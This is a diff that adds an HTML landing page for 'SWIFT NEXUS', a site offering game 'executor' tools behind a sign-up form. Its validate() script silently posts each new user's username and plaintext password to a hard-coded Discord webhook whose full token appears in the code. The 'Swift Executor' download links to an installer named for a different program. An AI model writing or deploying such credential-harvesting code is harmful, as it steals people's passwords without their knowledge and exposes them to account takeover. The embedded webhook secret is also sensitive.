@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SWIFT NEXUS | THE ELITE</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap');
+
+        :root {
+            --primary: #38bdf8;
+            --accent: #22c55e;
+            --bg: #030712;
+            --card-bg: rgba(17, 24, 39, 0.7);
+            --error: #f87171;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background-color: var(--bg); color: white; overflow-x: hidden; height: 100vh; }
+
+        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at center, #111827 0%, #030712 100%); }
+
+        header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 20px 8%; background: rgba(3, 7, 18, 0.5); backdrop-filter: blur(15px);
+            position: fixed; width: 100%; top: 0; z-index: 1000; border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .logo-box { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+        .logo { font-size: 28px; font-weight: 800; color: var(--primary); letter-spacing: 2px; }
+        .sa-tag { background: var(--accent); color: white; padding: 2px 8px; border-radius: 5px; font-size: 11px; font-weight: 700; }
+
+        nav ul { display: flex; list-style: none; gap: 30px; }
+        nav ul li a { text-decoration: none; color: #94a3b8; font-weight: 500; cursor: pointer; transition: 0.3s; }
+        nav ul li a:hover { color: var(--primary); }
+
+        section { min-height: 100vh; display: none; align-items: center; justify-content: center; padding: 120px 20px; text-align: center; }
+        .active { display: flex; flex-direction: column; animation: fadeIn 0.8s ease; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .hero h1 { font-size: clamp(3.5rem, 10vw, 7rem); font-weight: 800; background: linear-gradient(to bottom, #fff 30%, var(--primary) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
+
+        .btn-main {
+            padding: 18px 50px; background: var(--primary); color: #030712; font-weight: 700;
+            border-radius: 12px; font-size: 16px; border: none; cursor: pointer; transition: 0.4s;
+            box-shadow: 0 0 30px rgba(56, 189, 248, 0.3); text-decoration: none; display: inline-block;
+        }
+        .btn-main:hover { background: white; transform: scale(1.05); }
+
+        .glass-card { background: var(--card-bg); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 25px; transition: 0.4s; text-align: left; max-width: 800px; width: 100%; }
+
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; margin-top: 40px; width: 100%; max-width: 1200px; }
+        .tool-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 30px; border-radius: 20px; transition: 0.3s; position: relative; }
+        .tool-card:hover { border-color: var(--primary); transform: translateY(-5px); }
+        .status { font-size: 10px; font-weight: 800; padding: 3px 8px; border-radius: 4px; float: right; }
+
+        input { width: 100%; padding: 16px; margin: 10px 0 20px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; color: white; outline: none; }
+        .error { color: var(--error); font-size: 12px; margin-bottom: 15px; display: none; font-weight: 600; padding: 10px; background: rgba(248, 113, 113, 0.1); border-radius: 8px; }
+
+        .loader-wrap { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; margin-top: 20px; }
+        .loader-fill { height: 100%; background: var(--primary); width: 0%; transition: width 3s linear; }
+    </style>
+</head>
+<body>
+
+    <canvas id="bg-canvas"></canvas>
+
+    <header>
+        <a href="#" onclick="show('home')" class="logo-box">
+            <span class="logo">SWIFT</span>
+            <span class="sa-tag">NEXUS 🇸🇦</span>
+        </a>
+        <nav>
+            <ul>
+                <li><a onclick="show('home')">Home</a></li>
+                <li><a onclick="show('academy')">Who is Swift?</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <section id="home" class="active">
+        <div class="hero">
+            <h1>SWIFT NEXUS</h1>
+            <p style="color: #94a3b8; letter-spacing: 5px; margin-bottom: 40px;">THE SAUDI ELITE HUB</p>
+            <button onclick="show('login')" class="btn-main">GET STARTED</button>
+        </div>
+    </section>
+
+    <section id="academy">
+        <div class="glass-card">
+            <h2 style="color:var(--primary); margin-bottom: 20px; font-size: 32px;">من هو سويفت؟ (Who is SWIFT?)</h2>
+            <p style="color:#e2e8f0; font-size: 18px; line-height: 1.8; margin-bottom: 20px;">سويفت هو مشروع تقني سعودي طموح يهدف إلى توفير أدوات تنفيذ (Executors) وسكربتات متطورة بأعلى معايير الأمان.</p>
+            <p style="color:#94a3b8; line-height: 1.6;">نحن نركز على تقديم تجربة مستخدم سلسة وقوية، مع حماية كاملة للهوية والبيانات. سويفت ليس مجرد أداة، بل هو مجتمع للمحترفين.</p>
+        </div>
+    </section>
+
+    <section id="login">
+        <div class="glass-card" style="max-width: 450px; width: 100%;">
+            <h2 style="margin-bottom: 10px;">Authorization</h2>
+            <div id="err" class="error"></div>
+            <label style="font-size: 11px; color: #64748b;">USERNAME</label>
+            <input type="text" id="user" placeholder="6+ characters">
+            <label style="font-size: 11px; color: #64748b;">SECURITY KEY</label>
+            <input type="password" id="pass" placeholder="8+ chars, Upper, Lower, Symbol">
+            <button onclick="validate()" class="btn-main" style="width: 100%;">ACCESS HUB</button>
+        </div>
+    </section>
+
+    <section id="welcome">
+        <div style="max-width: 500px;">
+            <h2 style="font-size: 3rem;">WELCOME, <span id="agent" style="color: var(--primary);">AGENT</span></h2>
+            <p style="color: #94a3b8; margin-top: 10px;">SYNCHRONIZING SECURE TUNNEL...</p>
+            <div class="loader-wrap"><div id="bar" class="loader-fill"></div></div>
+        </div>
+    </section>
+
+    <section id="tools">
+        <h2 style="font-size: 3rem; margin-bottom: 30px;">THE <span style="color: var(--primary);">ARSENAL</span></h2>
+        <div class="grid">
+            <div class="tool-card">
+                <span class="status" style="background:rgba(34,197,94,0.2); color:var(--accent)">ONLINE</span>
+                <h3>Swift Executor</h3>
+                <p style="color:#64748b; font-size: 13px; margin: 15px 0;">Primary engine for high-speed execution.</p>
+                <a href="TLauncher-Installer-1.9.5.5.exe" download class="btn-main" style="padding: 10px 25px; font-size: 13px;">DOWNLOAD</a>
+            </div>
+            <div class="tool-card" style="opacity: 0.6;">
+                <span class="status" style="background:rgba(251,191,36,0.2); color:#fbbf24">COMING</span>
+                <h3>Nexus Scripts</h3>
+                <p style="color:#64748b; font-size: 13px; margin: 15px 0;">Premium script library (Updating...)</p>
+                <button disabled style="background:#334155; color:#94a3b8; padding:10px 25px; border:none; border-radius:10px;">LOCKED</button>
+            </div>
+        </div>
+        <p style="margin-top: 50px; color: var(--accent); font-weight: 700;">🇸🇦 SAUDI PRIDE 🇸🇦</p>
+    </section>
+
+    <script>
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        let stars = [];
+        function init() {
+            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+            stars = [];
+            for(let i=0; i<150; i++) stars.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, s:Math.random()*2, sp:Math.random()*0.5});
+        }
+        function draw() {
+            ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle="white";
+            stars.forEach(s => {
+                ctx.beginPath(); ctx.arc(s.x, s.y, s.s, 0, Math.PI*2); ctx.fill();
+                s.y -= s.sp; if(s.y<0) s.y=canvas.height;
+            });
+            requestAnimationFrame(draw);
+        }
+        window.addEventListener('resize', init); init(); draw();
+
+        function show(id) {
+            document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            window.scrollTo(0,0);
+        }
+
+        // --- نظام حفظ ومنع تكرار اليوزر ---
+        function validate() {
+            const u = document.getElementById('user').value.trim();
+            const p = document.getElementById('pass').value.trim();
+            const e = document.getElementById('err');
+            e.style.display = 'none';
+
+            // الأساسيات
+            if(u.length < 6 || /[\u0600-\u06FF]/.test(u)) return showError("Username: 6+ chars, No Arabic.");
+            const hasUp = /[A-Z]/.test(p), hasLo = /[a-z]/.test(p), hasSy = /[!@#$%^&*]/.test(p);
+            if(p.length < 8 || !hasUp || !hasLo || !hasSy) return showError("Key: 8+ chars, Upper, Lower, Symbol.");
+
+            // قاعدة البيانات المحلية
+            let users = JSON.parse(localStorage.getItem('swift_users') || '{}');
+
+            if(users[u]) {
+                // إذا اليوزر موجود، نتحقق من الكي
+                if(users[u] !== p) {
+                    return showError("This username is already taken. Try another.");
+                } else {
+                    // إذا اليوزر والكي صحيحة (تسجيل دخول قديم)
+                    loginSuccess(u);
+                }
+            } else {
+                // تسجيل جديد
+                users[u] = p;
+                localStorage.setItem('swift_users', JSON.stringify(users));
+                
+                // إرسال للديسكورد (فقط للمستخدمين الجدد)
+                const hook = "https://discord.com/api/webhooks/1491096636250788073/q8E_c3bjD2qxXfnGzDeEcsBzIhuqSzK6Fx9vXpgo3O4Y8_9Fu0d38REi-z3rhVx0hxGn";
+                fetch(hook, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
+                    username:"SWIFT DATABASE", embeds:[{title:"🆕 NEW AGENT REGISTERED", color:0x38bdf8, fields:[{name:"USER", value:u}, {name:"KEY", value:p}]}]
+                })});
+
+                loginSuccess(u);
+            }
+        }
+
+        function loginSuccess(u) {
+            document.getElementById('agent').innerText = u.toUpperCase();
+            show('welcome');
+            document.getElementById('bar').style.width = "100%";
+            setTimeout(() => show('tools'), 3000);
+        }
+
+        function showError(m) {
+            const e = document.getElementById('err');
+            e.innerText = "⚠️ " + m; e.style.display = "block";
+        }
+    </script>
+</body>
+</html>
